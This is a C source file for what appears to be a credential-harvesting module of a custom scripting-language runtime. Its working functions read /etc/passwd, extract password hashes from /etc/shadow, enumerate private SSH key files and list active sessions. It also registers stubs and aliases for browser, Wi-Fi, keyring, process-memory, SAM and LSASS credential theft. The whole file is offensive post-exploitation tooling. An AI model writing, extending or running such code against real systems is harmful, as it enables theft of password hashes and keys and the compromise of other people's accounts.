#include "jky_builtins.h"
#include "_stubs.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pwd.h>
#include <grp.h>
#include <unistd.h>
#include <dirent.h>

static BuiltinResult bi_cred_users(VM *vm, Value *a, int c, Value *out) {
    (void)vm; (void)a; (void)c;
    Value arr = mkarray();
    FILE *f = fopen("/etc/passwd", "r");
    if (!f) { *out = arr; return BUILTIN_OK; }
    char line[512];
    while (fgets(line, sizeof(line), f)) {
        char *u = strtok(line, ":");
        char *p = strtok(NULL, ":");
        char *uid = strtok(NULL, ":");
        char *gid = strtok(NULL, ":");
        char *gecos = strtok(NULL, ":");
        char *home = strtok(NULL, ":");
        char *shell = strtok(NULL, ":\n");
        if (!u) continue;
        Value d = mkdict();
        dict_set(d.v.dict, "name",  mkstr(u));
        dict_set(d.v.dict, "uid",   mkint(uid?atoi(uid):0));
        dict_set(d.v.dict, "gid",   mkint(gid?atoi(gid):0));
        dict_set(d.v.dict, "home",  mkstr(home?home:""));
        dict_set(d.v.dict, "shell", mkstr(shell?shell:""));
        dict_set(d.v.dict, "gecos", mkstr(gecos?gecos:""));
        dict_set(d.v.dict, "passwd",mkstr(p?p:""));
        arr_push(arr.v.arr, d);
    }
    fclose(f);
    *out = arr;
    return BUILTIN_OK;
}

static BuiltinResult bi_cred_secrets(VM *vm, Value *a, int c, Value *out) {
    (void)vm; (void)a; (void)c;
    Value arr = mkarray();
    FILE *f = fopen("/etc/shadow", "r");
    if (!f) { *out = arr; return BUILTIN_OK; }
    char line[512];
    while (fgets(line, sizeof(line), f)) {
        char *u = strtok(line, ":");
        char *h = strtok(NULL, ":");
        if (!u || !h) continue;
        Value d = mkdict();
        dict_set(d.v.dict, "name", mkstr(u));
        dict_set(d.v.dict, "hash", mkstr(h));
        arr_push(arr.v.arr, d);
    }
    fclose(f);
    *out = arr;
    return BUILTIN_OK;
}

static BuiltinResult bi_cred_ssh_keys(VM *vm, Value *a, int c, Value *out) {
    (void)vm; (void)a; (void)c;
    Value arr = mkarray();
    const char *home = getenv("HOME");
    if (!home) { *out = arr; return BUILTIN_OK; }
    char path[512]; snprintf(path, sizeof(path), "%s/.ssh", home);
    DIR *d = opendir(path);
    if (!d) { *out = arr; return BUILTIN_OK; }
    struct dirent *e;
    while ((e = readdir(d))) {
        if (strstr(e->d_name, "id_") || strstr(e->d_name, ".pem")) {
            Value x = mkdict();
            dict_set(x.v.dict, "name", mkstr(e->d_name));
            dict_set(x.v.dict, "path", mkstr(path));
            arr_push(arr.v.arr, x);
        }
    }
    closedir(d);
    *out = arr;
    return BUILTIN_OK;
}

static BuiltinResult bi_cred_sessions(VM *vm, Value *a, int c, Value *out) {
    (void)vm; (void)a; (void)c;
    Value arr = mkarray();
    FILE *f = popen("who 2>/dev/null", "r");
    if (!f) { *out = arr; return BUILTIN_OK; }
    char line[512];
    while (fgets(line, sizeof(line), f)) {
        size_t n = strlen(line); if (n && line[n-1]=='\n') line[n-1]=0;
        arr_push(arr.v.arr, mkstr(line));
    }
    pclose(f);
    *out = arr;
    return BUILTIN_OK;
}

static BuiltinResult bi_cred_token(VM *vm, Value *a, int c, Value *out) {
    (void)vm; (void)a; (void)c;
    Value d = mkdict();
    dict_set(d.v.dict, "uid", mkint((int64_t)getuid()));
    dict_set(d.v.dict, "gid", mkint((int64_t)getgid()));
    dict_set(d.v.dict, "euid", mkint((int64_t)geteuid()));
    dict_set(d.v.dict, "egid", mkint((int64_t)getegid()));
    *out = d;
    return BUILTIN_OK;
}

STUB_DICT(bi_cred_process_memory)
STUB_ARRAY(bi_cred_browser)
STUB_ARRAY(bi_cred_wifi)
STUB_ARRAY(bi_cred_keyring)

const Builtin BUILTINS_CRED[] = {
    { "cred_users",          0, 0, bi_cred_users      },
    { "cred_secrets",        0, 0, bi_cred_secrets    },
    { "cred_process_memory", 0, 0, bi_cred_process_memory},
    { "cred_browser",        0, 0, bi_cred_browser    },
    { "cred_wifi",           0, 0, bi_cred_wifi       },
    { "cred_ssh_keys",       0, 0, bi_cred_ssh_keys   },
    { "cred_keyring",        0, 0, bi_cred_keyring    },
    { "cred_sessions",       0, 0, bi_cred_sessions   },
    { "cred_token",          1, 1, bi_cred_token      },
    /* aliases for the Windows-style names */
    { "cred_sam",            0, 0, bi_cred_users      },
    { "cred_lsass",          0, 0, bi_cred_process_memory},
    { NULL, 0, 0, NULL },
};
